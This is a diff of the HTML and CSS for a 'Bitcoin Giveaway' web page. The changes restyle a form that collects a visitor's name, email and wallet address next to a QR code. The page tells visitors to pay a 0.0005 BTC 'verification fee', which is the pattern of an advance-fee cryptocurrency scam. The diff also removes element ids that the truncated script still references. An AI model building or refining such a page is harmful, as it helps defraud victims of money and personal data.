@@ -15,7 +15,7 @@
     
     .wrapper {
         display: flex;
-        flex-direction: row; /* Default to row layout */
+        flex-direction: row;
         justify-content: center;
         align-items: center;
         width: 80%;
@@ -27,56 +27,78 @@
     }
     
     .left-section, .right-section {
-        flex: 1; /* Adjust the flex basis for equal width on smaller screens */
+        flex: 1;
+        padding: 10px;
     }
 
-    .right-section {
-        padding-left: 20px;
-    }
-    
     .wrapper header {
         text-align: center;
-        font-size: 24px; /* Smaller font size for mobile */
+        font-size: 24px;
         font-weight: 600;
         color: #f8b400;
         margin-bottom: 20px;
     }
-    
+
     form .field {
         margin-bottom: 15px;
     }
-    
+
+    form .input-area {
+        position: relative;
+    }
+
     form input, form textarea {
-        font-size: 16px; /* Smaller font size for mobile */
+        width: 100%;
+        padding: 10px;
+        font-size: 16px;
+        border-radius: 5px;
+        border: 1px solid #6c757d;
+    }
+
+    .input-area i {
+        position: absolute;
+        top: 50%;
+        left: 10px;
+        transform: translateY(-50%);
+        color: #6c757d;
+        font-size: 16px;
     }
 
     form input[type="submit"] {
-        height: 45px; /* Smaller button for mobile */
+        background: #f8b400;
+        color: white;
+        cursor: pointer;
     }
 
-    /* Media Query for Screens smaller than 768px */
+    form input[type="submit"]:hover {
+        background: #ffcc00;
+    }
+
+    .note {
+        font-size: 14px;
+    }
+
     @media (max-width: 768px) {
         .wrapper {
-            flex-direction: column; /* Stack vertically on small screens */
-            width: 95%; /* Use more screen width on smaller devices */
-            margin: 20px auto; /* Less margin for small screens */
-            padding: 10px; /* Less padding */
+            flex-direction: column;
+            width: 95%;
+            margin: 20px auto;
+            padding: 10px;
         }
 
         .left-section, .right-section {
-            width: 100%; /* Full width for stacked layout */
-            padding: 0; /* Remove padding for better use of space */
+            width: 100%;
         }
 
-        .right-section {
-            margin-top: 20px; /* Space between sections when stacked */
+        header {
+            font-size: 18px;
         }
     }
   </style>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
 </head>
 <body>
-  <div id='wrapper' class="wrapper">
+  <div class="wrapper">
     <div class="left-section">
       <header>Bitcoin Giveaway</header>
       <form id="bitcoinForm" action="#">
@@ -84,42 +106,31 @@
           <div class="input-area">
             <input id="fullName" type="text" placeholder="Your Full Name">
             <i class="icon fas fa-user"></i>
-            <i class="error error-icon fas fa-exclamation-circle"></i>
           </div>
-          <div class="error error-txt" id="fullNameError">Name can't be blank</div>
         </div>
         <div class="field">
           <div class="input-area">
             <input id="email" type="email" placeholder="Email Address">
             <i class="icon fas fa-envelope"></i>
-            <i class="error error-icon fas fa-exclamation-circle"></i>
           </div>
-          <div class="error error-txt" id="emailError">Email can't be blank</div>
         </div>
         <div class="field">
           <div class="input-area">
             <textarea id="walletAddress" placeholder="Bitcoin Wallet Address"></textarea>
             <i class="icon fas fa-wallet"></i>
-            <i class="error error-icon fas fa-exclamation-circle"></i>
           </div>
-          <div class="error error-txt" id="walletAddressError">Wallet Address can't be blank</div>
         </div>
         <input type="submit" value="Submit">
       </form>
-      <div class="success-message" id="successMessage">
-        <h2>Thank you for submitting!</h2>
-        <p>Good luck!</p>
-      </div>
     </div>
-    <div id='right' class="right-section">
-      <img src="Your_Bitcoin_QR_Code.png" alt="QR Code" style="width: 100%; max-width: 200px;">
+    <div class="right-section">
+      <img src="Your_Bitcoin_QR_Code.png" alt="QR Code" style="max-width: 100%;">
       <div class="note">
         <p><strong>Important Note:</strong> There is a verification fee of 0.0005 BTC required for processing your submission. Please ensure your Bitcoin wallet is funded before submitting.</p>
       </div>
     </div>
   </div>
-
-  <script>
+   <script>
     const wrapper = document.getElementById('wrapper');
     const form = document.getElementById('bitcoinForm');
     const right = document.getElementById('right');
